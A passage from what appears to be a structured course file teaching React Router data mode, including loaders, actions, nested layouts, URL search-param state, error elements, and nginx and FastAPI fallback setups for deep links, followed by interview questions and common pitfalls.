<p>A <b>loader</b> is an async function on a route, called with <code>{ params, request }</code> <i>before</i> the route renders. Its return value is read with <code>useLoaderData()</code>. All matched routes' loaders run <b>in parallel</b>, which removes the render-then-fetch waterfall of nested <code>useEffect</code> fetching (Day 7). An <b>action</b> receives non-GET submissions from <code>&lt;Form method="post"&gt;</code> (or <code>useSubmit</code> / a fetcher); its return value is read with <code>useActionData()</code>, it can <code>return redirect(...)</code>, and after it finishes the router <b>revalidates</b> (re-runs) the loaders on the page so the UI shows fresh data. <code>useNavigation().state</code> is <code>"idle"</code>, <code>"loading"</code> or <code>"submitting"</code> for global pending UI, and <code>useFetcher()</code> lets you call loaders and actions <i>without</i> navigating (a "like" button, an inline archive).</p>
<h5>Errors and 404s</h5>
<p>If a loader, action or render throws, the router renders the <b>nearest</b> <code>errorElement</code> up the route tree instead of that route's element; the layouts above it stay on screen. Inside it, <code>useRouteError()</code> returns what was thrown. Throw <code>data("Not found", { status: 404 })</code> (or a <code>Response</code>) for expected HTTP failures and check them with <code>isRouteErrorResponse(error)</code>. A URL that matches no route at all produces a 404 route error at the root; a <code>{ path: "*" }</code> child inside the root layout lets you render a friendly 404 page while keeping the header and navigation.</p>`,
      why: `<p>Before routers, single-page apps kept "which screen am I on" in component state: <code>const [page, setPage] = useState("home")</code>. The URL never changed, so there was no deep linking ("send me the link to that project"), refresh dropped you on the home page, the Back button left the app entirely, analytics saw one page, and screen readers never heard a navigation. The opposite extreme, a classic multi-page app, gets URLs right but reloads the whole document on every click, losing in-memory state and repainting everything.</p>
<p>Client-side routing gives you both: real, shareable URLs <i>and</i> instant in-app transitions. Nested routes solve the next problem: most apps are a hierarchy of shells (app chrome → section sidebar → page → tab), and expressing that as nested routes with outlets avoids re-rendering and duplicating layouts on every page.</p>
<p>Data mode solves a third problem that bit almost every React app: <b>fetch waterfalls and loading spaghetti</b>. When every component fetches in its own effect, the parent renders, then fetches, then renders the child, which only then starts <i>its</i> fetch. Loaders let the router know the data needs of the whole matched tree up front, start all of them in parallel at navigation time (even on hover with prefetching), cancel them when the user navigates away, and centralise error handling per route. Actions bring back the web's original model of mutations (a form posts, the server responds, the page re-reads data) without full page reloads.</p>
<p>And because the URL becomes the source of truth for "where am I and what am I looking at", a whole class of state (current tab, filters, page number, selected item) can move out of <code>useState</code> and global stores into the address bar, where it is free, shareable and survives refreshes.</p>`,
      diagram: {
        html: flow([
          ["Click &lt;Link&gt;", "or Back / Forward (popstate)", "w"],
          ["router.navigate()", "outside React"],
          ["matchRoutes()", "ranked: static &gt; :param &gt; *"],
          ["Loaders run", "in parallel, abortable", "g"],
          ["history.pushState", "URL committed"],
          ["Render matches", "Root → &lt;Outlet&gt; → Projects → &lt;Outlet&gt; → Project", "g"]
        ]) + lanes([
          ["Route tree", ["/ (RootLayout, errorElement)", "&nbsp;&nbsp;index → Home", "&nbsp;&nbsp;projects (ProjectsLayout)", "&nbsp;&nbsp;&nbsp;&nbsp;index → ProjectList (loader)", "&nbsp;&nbsp;&nbsp;&nbsp;new → NewProject (action)", "&nbsp;&nbsp;&nbsp;&nbsp;:projectId → ProjectPage (loader)", "&nbsp;&nbsp;* → NotFound"]],
          ["URL /projects/42 matches", ["RootLayout", "ProjectsLayout", "ProjectPage with params { projectId: \"42\" }"]],
          ["Production server", ["/assets/*.js → file", "/api/* → FastAPI", "everything else → index.html"]]
        ]),
        steps: [
          `A click on a <code>&lt;Link&gt;</code> is intercepted (only a plain left click without modifier keys); Back/Forward fire <code>popstate</code>. Both call into the router instance created by <code>createBrowserRouter</code>, which lives outside React.`,
          `The router matches the new location against the route tree. Matching is ranked by specificity, and produces a <b>list of matches</b> from root to leaf, each with its params.`,
          `It calls the loaders of every match that is new or whose params/search changed, <b>in parallel</b>, each with a <code>request</code> whose <code>signal</code> aborts if the user navigates again. Meanwhile <code>useNavigation().state</code> is <code>"loading"</code> and the old page stays on screen.`,
          `When loaders resolve, the router commits: it updates the URL via the History API and publishes new state (location, matches, loader data, errors). If a loader threw, the nearest <code>errorElement</code> takes over that part of the tree.`,
          `<code>RouterProvider</code> re-renders: the root element renders, its <code>&lt;Outlet /&gt;</code> renders the next match, and so on down to the leaf. Layouts whose match didn't change keep their component state.`,
          `On a <b>hard refresh</b> of <code>/projects/42</code> the browser asks the <i>server</i> for that path. nginx or FastAPI must answer with <code>index.html</code>; then the app boots and step 2 runs for the initial URL.`
        ]
      },
      ex: [
        {
          t: "Install and create the router (src/main.tsx)",
          lang: "tsx",
          code: `// npm install react-router
import { StrictMode } from "react";
import { createRoot } from "react-dom/client";
import { createBrowserRouter } from "react-router";
import { RouterProvider } from "react-router/dom";
import RootLayout from "./routes/RootLayout";
import RouteError from "./routes/RouteError";
import Home from "./routes/Home";
import NotFound from "./routes/NotFound";
import "./index.css";

const router = createBrowserRouter([
  {
    path: "/",
    element: <RootLayout />,
    errorElement: <RouteError />, // catches anything thrown below that has no closer errorElement
    children: [
      { index: true, element: <Home /> },  // renders at exactly "/"
      { path: "*", element: <NotFound /> }, // 404 inside the layout
    ],
  },
]);

createRoot(document.getElementById("root")!).render(
  <StrictMode>
    <RouterProvider router={router} />
  </StrictMode>
);`,
          note: `<p>Create the router <b>once, at module level</b>, never inside a component (it would be recreated on every render and lose all state). <code>RouterProvider</code> is imported from <code>react-router/dom</code>, the DOM-specific entry of the same package, which the v7 docs recommend for browser apps because it wires up React DOM's <code>flushSync</code> for the router's synchronous update option; <code>react-router</code> also exports a <code>RouterProvider</code>, so both compile. <code>Home</code>, <code>NotFound</code> and <code>RouteError</code> are ordinary components you write in <code>src/routes/</code>.</p>`
        },
        {
          t: "A layout route with NavLink, Outlet and global pending UI",
          lang: "tsx",
          code: `// src/routes/RootLayout.tsx
import { NavLink, Outlet, ScrollRestoration, useNavigation } from "react-router";

const linkClass = ({ isActive }: { isActive: boolean }) =>
  isActive ? "nav-link active" : "nav-link";

export default function RootLayout() {
  const navigation = useNavigation();
  const busy = navigation.state !== "idle";

  return (
    <div className="app">
      <header className="topbar">
        <nav aria-label="Main">
          {/* end: active only on exactly "/" */}
          <NavLink to="/" end className={linkClass}>Home</NavLink>
          <NavLink to="/projects" className={linkClass}>Projects</NavLink>
          <NavLink to="/settings" className={linkClass}>Settings</NavLink>
        </nav>
        {busy && <div className="progress-bar" role="progressbar" aria-label="Loading page" />}
      </header>

      {/* the matched child route renders here */}
      <main aria-busy={busy}>
        <Outlet />
      </main>

      {/* data-mode only: restores scroll on Back, scrolls to top on new pages */}
      <ScrollRestoration />
    </div>
  );
}`,
          out: `At /projects/42: the header shows "Projects" highlighted (it matches /projects and its descendants),
"Home" is not highlighted because of end, and the project page renders inside <main>.`,
          note: `<p>The layout renders once and <b>stays mounted</b> while you move between child pages, so its state (an open menu, a search box) survives navigation. <code>useNavigation()</code> describes the <i>pending</i> navigation: while loaders for the next page run, the current page stays visible and you can show a top progress bar instead of blanking the screen.</p>`
        },
        {
          t: "Dynamic segment + loader + 404 from the API (src/routes/project.tsx)",
          lang: "tsx",
          code: `import { Link, data, useLoaderData, type LoaderFunctionArgs } from "react-router";

export type Project = {
  id: number;
  name: string;
  status: "active" | "archived";
  owner: string;
};

export async function projectLoader({ params, request }: LoaderFunctionArgs) {
  // request.signal aborts if the user navigates away before this resolves
  const res = await fetch(\`/api/projects/\${params.projectId}\`, { signal: request.signal });
  if (res.status === 404) {
    throw data("This project does not exist or was deleted.", { status: 404 });
  }
  if (!res.ok) throw new Error(\`GET /api/projects/\${params.projectId} failed: \${res.status}\`);
  return (await res.json()) as Project;
}

export function ProjectPage() {
  const project = useLoaderData<typeof projectLoader>();
  return (
    <article>
      <h1>{project.name}</h1>
      <p>Owner: {project.owner} · Status: {project.status}</p>
      <Link to="edit">Edit</Link> {/* relative: /projects/42/edit */}
      {" · "}
      <Link to="..">All projects</Link> {/* up one route level */}
    </article>
  );
}

// src/routes/RouteError.tsx
import { isRouteErrorResponse, useRouteError } from "react-router";

export default function RouteError() {
  const error = useRouteError(); // unknown: anything can be thrown
  if (isRouteErrorResponse(error)) {
    return (
      <div role="alert">
        <h2>{error.status === 404 ? "Not found" : \`Error \${error.status}\`}</h2>
        <p>{typeof error.data === "string" ? error.data : error.statusText}</p>
      </div>
    );
  }
  const message = error instanceof Error ? error.message : "Unknown error";
  return (
    <div role="alert">
      <h2>Something went wrong</h2>
      <p>{message}</p>
    </div>
  );
}`,
          note: `<p>Wire it up as <code>{ path: "projects/:projectId", element: &lt;ProjectPage /&gt;, loader: projectLoader, errorElement: &lt;RouteError /&gt; }</code> under the root route. The component never sees a loading or error state: by the time it renders, the data is there, and failures went to the error element. FastAPI's <code>HTTPException(404)</code> becomes a typed route error instead of a blank page. (The two files are shown in one block; in your app put each in its own file.)</p>`
        },
        {
          t: "URL as state: filters and pagination with useSearchParams",
          lang: "tsx",
          code: `// src/routes/projects.tsx
import { Link, useLoaderData, useSearchParams, type LoaderFunctionArgs } from "react-router";
import type { Project } from "./project";

type ProjectListPage = { items: Project[]; total: number; page: number; pageSize: number };

// The loader reads the same search params, so the data always matches the URL.
export async function projectsLoader({ request }: LoaderFunctionArgs) {
  const url = new URL(request.url);
  const api = new URL("/api/projects", window.location.origin);
  for (const key of ["q", "status", "page"]) {
    const value = url.searchParams.get(key);
    if (value) api.searchParams.set(key, value);
  }
  const res = await fetch(api, { signal: request.signal });
  if (!res.ok) throw new Error(\`GET /api/projects failed: \${res.status}\`);
  return (await res.json()) as ProjectListPage;
}

export function ProjectList() {
  const { items, total, page, pageSize } = useLoaderData<typeof projectsLoader>();
  const [searchParams, setSearchParams] = useSearchParams();
  const q = searchParams.get("q") ?? "";
  const status = searchParams.get("status") ?? "all";
  const lastPage = Math.max(1, Math.ceil(total / pageSize));

  // Merge changes into the existing params instead of replacing them all.
  function update(changes: Record<string, string | null>, replace = false) {
    setSearchParams(
      (prev) => {
        const next = new URLSearchParams(prev);
        for (const [key, value] of Object.entries(changes)) {
          if (value === null || value === "" || value === "all") next.delete(key);
          else next.set(key, value);
        }
        return next;
      },
      { replace }
    );
  }

  return (
    <section>
      <input
        type="search"
        aria-label="Search projects"
        defaultValue={q}
        // typing replaces the history entry instead of adding one per keystroke
        onChange={(e) => update({ q: e.target.value, page: null }, true)}
      />
      <select
        aria-label="Status"
        value={status}
        onChange={(e) => update({ status: e.target.value, page: null })}
      >
        <option value="all">All</option>
        <option value="active">Active</option>
        <option value="archived">Archived</option>
      </select>

      <ul>
        {items.map((p) => (
          <li key={p.id}><Link to={String(p.id)}>{p.name}</Link></li>
        ))}
      </ul>

      <button disabled={page <= 1} onClick={() => update({ page: String(page - 1) })}>Previous</button>
      <span> Page {page} of {lastPage} </span>
      <button disabled={page >= lastPage} onClick={() => update({ page: String(page + 1) })}>Next</button>
    </section>
  );
}`,
          out: `URL: /projects?q=billing&status=active&page=2
Refresh → same filters, same page. Copy the URL to a colleague → they see the same list.
Back → previous page/filter (but not every keystroke of the search, because of replace).`,
          note: `<p>Changing search params is a navigation, so the list loader re-runs automatically. In a real app you would debounce the search input (Day 10 builds <code>useDebounce</code>). FastAPI side: <code>def list_projects(q: str | None = None, status: str | None = None, page: int = 1)</code> with Redis caching keyed on the normalised query.</p>`
        },
        {
          t: "Actions: create a project with &lt;Form&gt;, redirect, and pending state",
          lang: "tsx",
          code: `// src/routes/new-project.tsx
import { Form, redirect, useActionData, useNavigation, type ActionFunctionArgs } from "react-router";

type ActionErrors = { name?: string; form?: string };

export async function newProjectAction({ request }: ActionFunctionArgs) {
  const formData = await request.formData();
  const name = String(formData.get("name") ?? "").trim();

  if (name.length < 3) {
    const errors: ActionErrors = { name: "Name must be at least 3 characters." };
    return { errors };
  }

  const res = await fetch("/api/projects", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name }),
  });
  if (res.status === 409) {
    const errors: ActionErrors = { form: "A project with that name already exists." };
    return { errors };
  }
  if (!res.ok) throw new Error(\`POST /api/projects failed: \${res.status}\`);

  const created = (await res.json()) as { id: number };
  return redirect(\`/projects/\${created.id}\`);
}

export function NewProject() {
  const actionData = useActionData() as { errors: ActionErrors } | undefined;
  const navigation = useNavigation();
  const submitting = navigation.state === "submitting";

  return (
    <Form method="post" noValidate>
      <label>
        Project name
        <input name="name" aria-invalid={Boolean(actionData?.errors.name)} />
      </label>
      {actionData?.errors.name && <p role="alert">{actionData.errors.name}</p>}
      {actionData?.errors.form && <p role="alert">{actionData.errors.form}</p>}
      <button type="submit" disabled={submitting}>
        {submitting ? "Creating…" : "Create project"}
      </button>
    </Form>
  );
}`,
          note: `<p>Route: <code>{ path: "projects/new", element: &lt;NewProject /&gt;, action: newProjectAction }</code>. <code>&lt;Form&gt;</code> serialises the inputs into <code>FormData</code> exactly like a native form, but submits to the route's action instead of the server. Validation errors are <i>returned</i> (the user stays on the form); unexpected failures are <i>thrown</i> (they go to the error element). After the action, loaders on the page revalidate, so the project list is fresh when you come back. Day 9 replaces the hand-written validation with React Hook Form + Zod.</p>`
        },
        {
          t: "Programmatic navigation and mutations without navigating (useNavigate, useFetcher)",
          lang: "tsx",
          code: `import { useFetcher, useNavigate, type ActionFunctionArgs } from "react-router";

// Route: { path: "projects/:projectId/archive", action: archiveAction }  (no element)
export async function archiveAction({ params }: ActionFunctionArgs) {
  const res = await fetch(\`/api/projects/\${params.projectId}/archive\`, { method: "POST" });
  if (!res.ok) throw new Error(\`Archive failed: \${res.status}\`);
  return { ok: true };
}

export function ProjectToolbar({ projectId }: { projectId: number }) {
  const navigate = useNavigate();
  const fetcher = useFetcher();
  const archiving = fetcher.state !== "idle";

  return (
    <div className="toolbar">
      <button type="button" onClick={() => navigate(-1)}>Back</button>
      <button type="button" onClick={() => navigate(\`/projects/\${projectId}/edit\`)}>Edit</button>

      {/* posts to the archive action, then revalidates loaders; the URL does not change */}
      <fetcher.Form method="post" action={\`/projects/\${projectId}/archive\`}>
        <button type="submit" disabled={archiving}>
          {archiving ? "Archiving…" : "Archive"}
        </button>
      </fetcher.Form>
    </div>
  );
}`,
          note: `<p>Prefer <code>&lt;Link&gt;</code> for anything the user clicks to "go somewhere" (it is a real link, keyboard- and screen-reader friendly, and supports open-in-new-tab). Use <code>navigate()</code> for navigation that <i>results from</i> something else: after a save, after a timer, from a keyboard shortcut. Use a fetcher for mutations that should not change the URL; multiple fetchers can be in flight at once, each with its own state.</p>`
        },
        {
          t: "Production: make refresh and deep links work (nginx and FastAPI)",
          lang: "text",
          code: `# ---------- nginx (serving the Vite build in /usr/share/nginx/html) ----------
server {
  listen 80;
  root /usr/share/nginx/html;

  # API: never fall back to index.html here
  location /api/ {
    proxy_pass http://api:8000;
    proxy_set_header Host $host;
    proxy_set_header X-Forwarded-Proto $scheme;
  }

  # hashed build output: cache forever
  location /assets/ {
    add_header Cache-Control "public, max-age=31536000, immutable";
    try_files $uri =404;
  }

  # everything else: the file if it exists, otherwise the SPA shell
  location / {
    add_header Cache-Control "no-cache";
    try_files $uri $uri/ /index.html;
  }
}

# ---------- FastAPI serving the build itself (main.py) ----------
from pathlib import Path
from fastapi import FastAPI, HTTPException
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles
from app.api import api_router            # your APIRouter with all /api routes

DIST = (Path(__file__).parent / "dist").resolve()
app = FastAPI()
app.include_router(api_router, prefix="/api")                   # 1. API first
app.mount("/assets", StaticFiles(directory=DIST / "assets"), name="assets")

@app.get("/{full_path:path}", include_in_schema=False)          # 2. catch-all LAST
async def spa_fallback(full_path: str):
    if full_path == "api" or full_path.startswith("api/"):
        raise HTTPException(status_code=404)                      # unknown API → real 404 JSON
    candidate = (DIST / full_path).resolve()
    if full_path and candidate.is_relative_to(DIST) and candidate.is_file():
        return FileResponse(candidate)                            # favicon.ico, robots.txt …
    return FileResponse(DIST / "index.html", headers={"Cache-Control": "no-cache"})`,
          note: `<p><code>try_files $uri $uri/ /index.html</code> means: serve the file if it exists, else the directory, else <code>index.html</code> (with a 200), so React Router sees the real URL and renders the right page. Two rules matter: <b>never</b> let <code>/api/*</code> fall back to HTML (a typo in an API path would return <code>index.html</code> and your fetch fails with "Unexpected token &lt;" while parsing JSON), and serve <code>index.html</code> with <code>no-cache</code> so users pick up new deployments. Note that FastAPI's <code>StaticFiles(html=True)</code> alone does <b>not</b> do SPA fallback (it serves <code>index.html</code> for directories and <code>404.html</code> for misses), hence the explicit catch-all. The Vite dev server and <code>vite preview</code> already fall back, which is why the bug only appears after deployment.</p>`
        },
        {
          t: "Loaders + TanStack Query: prefetch in the loader, read from the cache",
          lang: "tsx",
          code: `// src/routes/project-query.tsx   (npm install @tanstack/react-query)
import { QueryClient, queryOptions, useSuspenseQuery } from "@tanstack/react-query";
import { data, useLoaderData, type LoaderFunctionArgs } from "react-router";
import type { Project } from "./project";

export const queryClient = new QueryClient(); // the same instance you pass to QueryClientProvider

export const projectQuery = (id: string) =>
  queryOptions({
    queryKey: ["projects", id],
    queryFn: async ({ signal }): Promise<Project> => {
      const res = await fetch(\`/api/projects/\${id}\`, { signal });
      if (!res.ok) throw new Error(\`GET /api/projects/\${id} failed: \${res.status}\`);
      return res.json();
    },
    staleTime: 30_000,
  });

export async function projectLoader({ params }: LoaderFunctionArgs) {
  const id = params.projectId;
  if (!id) throw data("Missing project id", { status: 400 });
  // starts the request at navigation time; resolves instantly if cached and fresh
  await queryClient.ensureQueryData(projectQuery(id));
  return { id };
}

export function ProjectPage() {
  const { id } = useLoaderData<typeof projectLoader>();
  const { data: project } = useSuspenseQuery(projectQuery(id)); // already in cache
  return <h1>{project.name}</h1>;
}`,
          note: `<p>This is the common production combination: the <b>router</b> decides <i>when</i> to fetch (as early as possible, in parallel), and <b>TanStack Query</b> (Day 7) owns <i>caching</i>, background refetching and invalidation after mutations. Loader data alone is not a cache: going back to a page re-runs its loader. With <code>ensureQueryData</code> a fresh cache entry makes the navigation instant.</p>`
        }
      ],
      internals: `<p><b>The router lives outside React.</b> <code>createBrowserRouter</code> builds a plain JavaScript state machine (this code descends from the old <code>@remix-run/router</code> package and now lives inside <code>react-router</code>). It owns a <code>history</code> object wrapping <code>window.history</code>, subscribes to <code>popstate</code>, and keeps a state object roughly like <code>{ location, matches, loaderData, actionData, errors, navigation, fetchers, revalidation }</code>. <code>RouterProvider</code> subscribes to that state and puts it into React context; every hook (<code>useLoaderData</code>, <code>useNavigation</code>, <code>useParams</code>…) is a context read. That's why the router can start loaders before any component renders, and why <code>router.navigate()</code> works from outside components.</p>
<p><b>Matching.</b> The route tree is flattened into "branches" (every root-to-leaf path), each branch is scored (static segments score highest, then dynamic, then splats; index routes get a bonus), branches are sorted by score, and the first branch that matches the pathname wins. The result is an array of matches, root first. Search params never affect matching.</p>
<p><b>A navigation, step by step.</b> On <code>navigate("/projects/42")</code> the router sets <code>navigation = { state: "loading", location: next }</code> (so pending UI can render) while <code>state.location</code> still points at the current page. It decides which loaders must run: new matches, matches whose params changed, all of them if the search string changed, and all of them after an action (this is <b>revalidation</b>; a route can opt out with <code>shouldRevalidate</code>). Each loader gets a <code>Request</code> whose <code>AbortSignal</code> is tied to this navigation: if another navigation starts, the old one is aborted and its results are discarded, which removes the classic "slow response overwrites fast response" race. When all loaders settle, the router pushes or replaces the history entry, swaps in the new loader data and errors, and sets <code>navigation</code> back to idle. One state update, one render.</p>
<p><b>Rendering the matches.</b> The provider renders the matches from the leaf upwards into a nested structure: each match's element is wrapped in a <code>RouteContext</code> provider whose <code>outlet</code> is the already-built element of the next match. <code>&lt;Outlet /&gt;</code> simply reads <code>outlet</code> from the nearest route context. Routes with an <code>errorElement</code> are wrapped in an internal error boundary (a class component, the only way to catch render errors, Day 10), and loader/action errors are injected as if thrown at that level, so the same <code>errorElement</code> handles both. Because a layout's element type and position don't change when you move between its children, React reconciles it in place and keeps its state; only the subtree under the outlet changes.</p>
<p><b>Transitions.</b> In v7 the router wraps its state updates in <code>React.startTransition</code> by default, so navigations are non-urgent updates that can be interrupted and that cooperate with Suspense (lazy components keep the previous screen visible instead of flashing a fallback). Day 12 explains transitions in depth.</p>
<p><b>Links.</b> <code>&lt;Link&gt;</code> renders <code>&lt;a href&gt;</code> with the resolved absolute URL. Its click handler bails out (letting the browser do its thing) for modified clicks (Ctrl/Cmd/Shift/Alt), non-left buttons, <code>target="_blank"</code>, or the <code>reloadDocument</code> prop; otherwise it calls <code>preventDefault()</code> and <code>navigate()</code>. <code>&lt;Form&gt;</code> works the same way for submit events, building a <code>Request</code> with the form data and routing it to the matching action.</p>`,
      prod: `<p>In a React → FastAPI → Redis → PostgreSQL product the router is the spine of the frontend:</p>
<ul class="pts">
<li><b>Deployment fallback is mandatory.</b> Whatever serves the SPA (nginx in the frontend container, a CDN such as CloudFront/S3, or FastAPI itself) must rewrite unknown non-file paths to <code>index.html</code>, while keeping <code>/api</code> 404s as JSON. On S3/CloudFront this is a "custom error response" or edge function; on Netlify-style hosts a rewrite rule. Test it by refreshing a deep URL on staging, every time you change infrastructure.</li>
<li><b>Caching headers.</b> Vite's output in <code>/assets</code> has content hashes, so cache it for a year with <code>immutable</code>; <code>index.html</code> must be <code>no-cache</code> (revalidated every time) or users keep running old bundles after a deploy.</li>
<li><b>Sub-path deployments.</b> If the app lives under <code>/app/</code>, set Vite's <code>base: "/app/"</code> <i>and</i> <code>createBrowserRouter(routes, { basename: "/app" })</code>, and make the server fallback point at <code>/app/index.html</code>.</li>
<li><b>URL as state is a product feature.</b> Support engineers paste URLs into tickets; PMs bookmark filtered dashboards. Keep filters, sorting, pagination, tabs and selected items in search params, validated (and clamped) when read, with defaults omitted from the URL to keep it short. The same params map 1:1 to FastAPI query parameters and to Redis cache keys, so normalise their order to improve hit rates.</li>
<li><b>Loaders + a cache.</b> Loader data is per-navigation; it is not shared between routes and is refetched on every visit. Large apps pair loaders with TanStack Query (<code>ensureQueryData</code> or <code>prefetchQuery</code>) so revisits are instant and mutations invalidate by key.</li>
<li><b>Errors at the right granularity.</b> Put an <code>errorElement</code> on the root (last resort), on each major section, and on routes whose data commonly fails (404s on detail pages), so a broken widget doesn't wipe the whole app chrome. Report non-404 route errors to Sentry from the error element.</li>
<li><b>Analytics and focus.</b> SPAs don't trigger page loads, so send page views from an effect on <code>useLocation().pathname</code>, update <code>document.title</code> per route (React 19 lets you render <code>&lt;title&gt;</code> inside components), and move focus to the main heading after navigation for screen-reader users.</li>
<li><b>At scale,</b> the route config becomes the app's table of contents: one module per feature exporting its routes (<code>projectsRoutes</code>, <code>adminRoutes</code>), composed in one place, each lazily loaded (next topic). Teams that need SSR, streaming or pre-rendering move to framework mode or another framework (Day 13).</li>
</ul>`,
      iq: [
        ["fresher", "What is client-side routing and how is it different from server-side routing?", `<p>With <b>server-side routing</b> every navigation is a full HTTP request for a new HTML document; the server decides what to render for each URL and the page reloads. With <b>client-side routing</b> the browser loads the app once; navigations update the URL with the History API (<code>pushState</code>) and the JavaScript router renders the matching components without a document request. Benefits: instant transitions, preserved in-memory state, shared layouts. Costs: the JS must load before anything shows (unless you SSR), the server needs an <code>index.html</code> fallback, and you handle focus, scroll and page titles yourself. The tempting wrong answer, "client-side routing means the server isn't involved", forgets that refresh and deep links still hit the server.</p>`],
        ["fresher", "Why do we use <code>&lt;Link&gt;</code> instead of <code>&lt;a href&gt;</code>?", `<p>A plain <code>&lt;a href="/projects"&gt;</code> makes the browser request a new document: the whole app reloads and all in-memory state (including the TanStack Query cache) is lost. <code>&lt;Link&gt;</code> still renders an <code>&lt;a&gt;</code> with a real <code>href</code> (so open-in-new-tab, copy link, SEO and accessibility work) but intercepts a plain click and performs a client-side navigation. Using <code>&lt;button onClick={() =&gt; navigate(...)}&gt;</code> for ordinary links is the opposite mistake: it breaks middle-click and screen readers announce a button, not a link.</p>`],
        ["mid", "Explain nested routes and <code>&lt;Outlet /&gt;</code>. What is a layout route and an index route?", `<p>Nested routes mirror nested UI: a URL like <code>/projects/42</code> matches a chain (root → projects → project). Each parent renders its own UI and an <code>&lt;Outlet /&gt;</code> where the matched child renders. A <b>layout route</b> has an element but no <code>path</code>; it wraps children (shared shell, auth guard) without adding a URL segment. An <b>index route</b> (<code>index: true</code>) is what renders in the parent's outlet when the URL is exactly the parent's path, e.g. the project list at <code>/projects</code>. Because a layout stays mounted while its children change, its state survives navigation between siblings.</p>`],
        ["mid", "When would you use <code>useSearchParams</code> instead of <code>useState</code>?", `<p>For any state a user would expect to survive a refresh, be shareable, or be undone with Back: filters, search terms, sort order, pagination, selected tab, an open detail panel. <code>useSearchParams</code> stores it in the query string, so the URL fully describes the screen. Keep <code>useState</code> for ephemeral UI (hover, an uncontrolled draft, a dropdown open flag). Caveats: values are always strings (parse and validate, clamp page numbers), use the functional updater and merge with the previous params so you don't wipe other keys, and use <code>{ replace: true }</code> for high-frequency updates like typing so you don't flood history.</p>`],
        ["mid", "A user refreshes <code>/settings/profile</code> in production and gets a 404 from nginx, but it works in development. Why, and how do you fix it?", `<p>In development the Vite dev server falls back to <code>index.html</code> for unknown paths. In production nginx looks for a file called <code>settings/profile</code>, finds none, and returns 404; the React app never loads, so the router never runs. Fix: <code>try_files $uri $uri/ /index.html;</code> in the SPA location, excluding <code>/api/</code> (which should be proxied and return real 404s), and serve <code>index.html</code> with <code>Cache-Control: no-cache</code>. With FastAPI serving the build, add a catch-all <code>GET /{full_path:path}</code> registered after the API routes. Switching to <code>createHashRouter</code> also "fixes" it but gives ugly <code>#/</code> URLs and is a workaround, not a solution.</p>`],
        ["senior", "What problem do loaders solve compared with fetching in <code>useEffect</code>? What are their limits?", `<p>Effect fetching starts only after a component renders, so nested components produce <b>waterfalls</b> (parent fetch → render child → child fetch), every component reimplements loading/error/race handling, and data can't start loading until the code has rendered. Loaders let the router fetch for <b>all matched routes in parallel at navigation time</b>, keep the old page visible while loading, abort stale requests via <code>request.signal</code>, send failures to <code>errorElement</code>, and revalidate after actions. Limits: loader data isn't a cache (revisits refetch, no background refetching, no sharing between routes), all loaders block the transition unless you return promises and stream them with <code>&lt;Await&gt;</code>, and in pure client apps the first load still waits for the JS bundle. That's why production apps usually combine loaders with TanStack Query: loaders <i>start</i> fetches, Query <i>caches</i> them.</p>`],
        ["senior", "How does React Router decide which route matches when <code>/projects/new</code> and <code>/projects/:projectId</code> are both defined?", `<p>Routes are not matched in declaration order (that was v5's <code>&lt;Switch&gt;</code>). The router flattens the tree into branches, scores each by its segments (static &gt; dynamic &gt; splat, with adjustments for index routes) and picks the highest-ranked branch that matches. So <code>/projects/new</code> always wins over <code>:projectId</code> for the URL <code>/projects/new</code>, regardless of order. The tempting answer, "put <code>new</code> first", is a v5 habit; it is harmless but unnecessary in v6/v7.</p>`],
        ["senior", "Your project page keeps the sidebar layout, but after an API error the whole screen turns into a generic error page. How do you fix it?", `<p>Errors bubble to the <b>nearest</b> route with an <code>errorElement</code>/<code>ErrorBoundary</code>. If only the root has one, any loader or render error anywhere replaces the root element, including the layout. Add <code>errorElement</code> to the project route (and to each major section) so only the outlet area is replaced and the sidebar remains. In the loader, convert expected failures into typed errors: <code>throw data("Not found", { status: 404 })</code> for a FastAPI 404 and check <code>isRouteErrorResponse</code> in the element, while unexpected errors are thrown as <code>Error</code> and reported to monitoring.</p>`],
        ["lead", "How would you structure routing for a large app with several teams?", `<p>One route module per feature (projects, billing, admin) exporting its route objects and owning its loaders, actions, error elements and pages; a thin <code>router.tsx</code> that composes them under shared layout routes (public shell, authenticated shell, admin shell). Every feature route is lazily loaded so teams don't inflate each other's bundles. Shared conventions: URL design reviewed like an API (stable, human-readable, versioned when changed with redirects from old paths), search-param schemas validated with Zod, a standard error element per section, and route <code>handle</code> metadata for breadcrumbs, titles and required roles. Typed links (or framework mode's generated types) prevent broken paths at compile time. The anti-pattern to avoid is a single giant route file that every team edits.</p>`],
        ["architect", "When would you choose React Router data mode in a Vite SPA versus framework mode or Next.js?", `<p>Data mode in a Vite SPA fits authenticated, app-like products (dashboards, internal tools, admin panels) where SEO doesn't matter, the backend is a separate FastAPI service, and you want simple static hosting behind nginx or a CDN. Framework mode (or Next.js, Day 13) is worth it when first-load performance and SEO matter (public marketing or content pages), when you want server rendering or pre-rendering, or when you want the server-side data layer and type generation the framework provides. The cost is a Node server in your architecture, a more complex deployment, and a more opinionated structure. A common split is a static or SSR marketing site plus a Vite SPA for the logged-in app. Because data mode and framework mode share the same route concepts (loaders, actions, nested routes), starting in data mode doesn't trap you.</p>`]
      ],
      gotchas: [
        `<b>Unknown <code>/api</code> paths returning <code>index.html</code>.</b> A too-greedy fallback means a mistyped endpoint answers 200 with HTML, and the frontend crashes with <code>SyntaxError: Unexpected token '&lt;'</code> while parsing JSON. Exclude <code>/api</code> from the fallback.`,
        `<b><code>useParams</code> values are <code>string | undefined</code></b> and always strings: <code>params.projectId === 42</code> is always false. Convert and validate (<code>Number(id)</code>, Zod), and handle <code>undefined</code> instead of sprinkling <code>!</code>.`,
        `<b><code>setSearchParams({ page: "2" })</code> replaces the whole query string</b>, silently dropping your filters. Use the functional form and copy the previous params. Also, unlike React state, multiple <code>setSearchParams</code> calls in the same tick don't queue on top of each other; make one call with all changes.`,
        `<b>Relative links resolve against the route hierarchy</b>, not the URL's slashes. <code>&lt;Link to=".."&gt;</code> from a route at <code>projects/:projectId</code> nested under <code>projects</code> goes to the parent <i>route</i>; inside pathless layout routes this can surprise you. Use <code>relative="path"</code> when you mean URL segments.`,
        `<b>Loaders run in parallel, not parent-then-child.</b> A child loader can't wait for or read its parent loader's result directly (use <code>useRouteLoaderData</code> in components, or a shared cache such as TanStack Query). This matters for auth checks in a parent loader: the children's fetches have already started.`,
